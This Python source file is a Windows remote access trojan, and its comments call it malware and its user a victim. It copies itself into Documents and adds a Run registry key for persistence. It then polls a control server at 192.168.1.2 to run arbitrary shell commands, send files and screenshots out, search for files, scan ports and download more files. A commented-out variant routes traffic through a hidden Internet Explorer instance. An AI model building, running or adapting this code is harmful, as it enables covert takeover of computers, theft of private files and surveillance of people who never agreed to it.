import requests, subprocess, urllib, os, shutil
import uuid
import winreg, pyautogui
import tempfile, socket
from win32com import client
from urllib.parse import urlencode, quote_plus
import time, sys

ie=client.Dispatch("InternetExplorer.Application" #initiates internet explorer com object
#ie.Visible=0 #makes it invisible, So that when victim runs the exe he doesn't see ie explorer opening nd all requests/repsponses
#happen through it
headers = {
    "User-Agent": "Shaan 1.0"
    }

def persistence():
    result = subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) #finds username because we are trying to save the malware in C:\Users\username\documents
    username = result.stdout.read().decode().replace("\r\n", "").split("\\")[-1]
    destination = "C:\\Users\\"+username+"\\Documents\program.exe"
    source = os.getcwd()
    source = source+"\\program.exe"
    if not (os.path.exists(destination)): #if the destination path i.e `C:\Users\username\document\malware.exe` doesn't already exists then that means malware is running for the first time on the PC
        #and we need to copy the `malware.exe` on this path and also set up startup registry so it starts automatically everytime on boot
        shutil.copy(source, destination)
        path = winreg.HKEY_CURRENT_USER
        key = winreg.OpenKeyEx(path, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "RunProgramAtStartup", 0, winreg.REG_SZ, destination)
        winreg.CloseKey(key)


def generate_random_filename():
    random_uuid = uuid.uuid4()
    filename = str(random_uuid).replace('-', '')
    return filename

def scanPort(IPaddr, port):
    s = socket.socket()
    s.settimeout(1) #setting timeout of 1 sec, If IP:PORT doesn't respond within that we'll assume the PORT is not up
    result2 = ''
    try:
        res = s.connect_ex((IPaddr, port)) #connect_ex connects to the IP:PORT and if 0 is returned then that means connection was successfull and the particular port is open
        #and then we close the connection and return port is open. Incase an exception occurs that means port is not open and then we return with blank result
        if (res == 0):
            result2 = f'Port {port} open\n'
            s.close() #closing connection after getting the result 1/0
    except Exception as e:
        pass
    return result2

def exec_command(cmd):
    result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) #This is a better way to execute commands than the prev subprocess command we used. It doesn't throw exceptions on invalid commands
    #rather returns invalid command without any error
    res = result.stdout.read().decode() #it gives bytes string result, We can only pass string data through `form-urlencoded` not binary bytes. So we decoded it to normal string before sending it in the http request
    err = result.stderr.read().decode()
    if res:
        requests.post("http://192.168.1.2/result", data={"result": res}, headers=headers)
        #res = ("result=" + urllib.parse.quote_plus(res)).encode() #converted data to `data=ourdata` format, urlencoded the ourdata value and bytes encoded the `data=urlencodedourdata` and finally sent it using form-urlencoded
        #ie.navigate("http://192.168.1.2/result", None, None, res, "User-Agent: shaan 1.0;\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8")
    else:
        #err = urlencode({"result": err}).encode()
        #ie.navigate("http://192.168.1.2/result", None, None, err, "User-Agent: shaan 1.0;\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8")
        requests.post("http://192.168.1.2/result", data={"result": err}, headers=headers)


def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png') #takes screenshot of the current screen on the vicitm computer, saves it on the current dir where the program/malware.exe is running as screenshot.png
    #Incase you use the cmd several times, old screenshot.png will get replaced by the latest screenshot.png. New filenames like screenshot2.png won't be created
    sendFile('screenshot.png') #finally we use sendFile function and pass it the `screenshot.png` that exists in current directory, It reads the file and send it to attacker server using `/storeFile` route

def searchFilesByExtension(path, extension):
    finalresutldatatosend = ''
    rootdir = path
    result = ''
    for rootdir, subdirs, files in os.walk(rootdir): #we start the finding of files with a current directory called root directory. Supose we want to find
        #all pdf files in `/root/CTFs/` then here root will be this directory. subdirs will contain all subdirs of root `/root/CTFs` for ex HTB,
        #VulnnetEndgame etc. and files will contain the files in root dir `/root/CTFs/` like `directorylistmedium, 10krockyou` etc. This way it'll loop through
        #literally all subdirs and files that exists inside `/root/CTFs` recursively no matter how much the depth is. So it'll go through all the subs/files
        #and find all files with the extension we have given
        for file in files:
            if file.endswith(extension):
                result += os.path.join(rootdir, file) + '\n'
    requests.post('http://192.168.1.2/result', data={"result": result}, headers=headers)
    #result = {"result": result}
    #finalresutldatatosend = urlencode(result).encode()
    #ie.navigate("http://192.168.1.2/result", None, None, finalresutldatatosend, "User-Agent: shaan 1.0;\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8")

def sendFile(path):
    result = ''
    if os.path.exists(path):
        with open(path, "rb") as f:
            filename = path.split("\\")[-1]
            files = {filename: f}
            requests.post('http://192.168.1.2/storeFile', files=files, headers=headers)
            #ie.navigate("http://192.168.1.2/storeFile", None, None, files, "User-Agent: Shaan 1.0;\r\nContent-Type: multipart/form-data; charset=utf-8")
    else:
        requests.post('http://192.168.1.2/result', data={"result": "File not found"}, headers=headers)
        #result = ("result=" + urllib.parse.quote_plus("File not found")).encode()
        #ie.navigate("http://192.168.1.2/storeFile", None, None, result, "User-Agent: shaan 1.0;\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8")

persistence()

try:
    while True:
        cdir = os.getcwd() #we always find out the current directory
        cmd = requests.get('http://192.168.1.2/connected?cdir=' + cdir).content
        # #time.sleep(2) #sleep for a while so that the previous operation results and this new `/connected` request responses don't mix up
        # #ie.navigate("http://192.168.1.2/connected?cdir="+cdir) #we send get request to connected with the current directory so that it can show that up
        # #on the shell. This sleep need is only present in ie.navigate when using requests to send requests mixing of responses isn't happening. So we can comment
        # #this out when we use requests to do our work. `time.sleep(2)` is used between `/connected` request and the prev requests where different operations are
        # #being performed so that responses don't mix up
        # # while ie.busy:
        # #     continue #we loop for a while until ie.navigate response gets recieved by our computer
        # cmd = ie.Document.body.innerHTML.replace('<pre>', '').replace('</pre>', '').encode() #we extract the command that comes as a response for the `/connected` http request
        # #we used a bit weird way of communication here because we can't open ports on the victim machine due to firewall and NAT so ports will only be opened
        # #on the attacker_server and we'll communicate through it

        #we encode the command that comes as response because previously our code was like this where we were decoding the cmd so i didn't want to remove that
        #code so i encoded the cmd value instead

        if "get" in cmd.decode():
            path = cmd.decode().split("$$$$$")[1]
            sendFile(path)

        elif "screenshot" in cmd.decode():
            take_screenshot()

        elif "find" == cmd.decode().split('$$$$$')[0]:
            #cmdSyntax `find$$$$$C:\Users\91797\Desktop$$$$$.pdf` This will search for all pdf files inside Desktop directory of user. It'll go fully deeper till the end to find all the pdf
            #files that exist inside Desktop in any path like Desktop/shaan/files/newfiles/shaan.pdf
            cmd, path, extension = cmd.decode().split('$$$$$')
            searchFilesByExtension(path, extension)

        elif cmd.decode().split(' ')[0] == 'portscan':
            cmd, IPaddr, portRange = cmd.decode().split(' ')
            start, end = portRange.split('-')
            start = int(start)
            end = int(end)
            newres = ''

            for port in range(start, end+1): #we extract the port range and then loop through that range and provide the IP:port to the function scanPort, if
                #port is open we see port open result or nothing. We keep appending the result on newres. And finally post `newres` to the attacker server it
                #contains all the open ports
                newres += scanPort(IPaddr, port)

            # result = ("result=" + urllib.parse.quote_plus(newres)).encode()
            # ie.navigate("http://192.168.1.2/result", None, None, result, "User-Agent: shaan 1.0;\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8")
            requests.post("http://192.168.1.2/result", data={"result": newres}, headers=headers)

        elif "put" in cmd.decode():
            try:
                path = cmd.decode().split("$$$$$")[1]
                if '\\' in path:
                    filename = path.split('\\')[-1] #if path is windows path we easily extract file
                else: #else if it's linux path we generate random filename idk why i did this. Leaving it like this only won't matter
                    ext = path.split('/')[-1].split('.')[-1]
                    filename = generate_random_filename() + '.' + ext
                resFileContent = requests.get('http://192.168.1.2/uploadFile?filename='+path).content
                if resFileContent == b'File you are trying to upload does not exist':
                    print('File you are trying to upload does not exist')
                    continue
                with open(filename, 'wb') as f:
                    f.write(resFileContent)
            except Exception:
                pass

        elif "exit" in cmd.decode(): #if exit cmd comes break this loop and program will exit automatically as nothing will be there to execute
            break

        elif "cd" == cmd.decode().split('$$$$$')[0]:
            try:
                os.chdir(cmd.decode().split('$$$$$')[1])
            except Exception:
                pass
        else:
            exec_command(cmd.decode())
except requests.exceptions.ConnectionError as err:
    sys.exit(0)
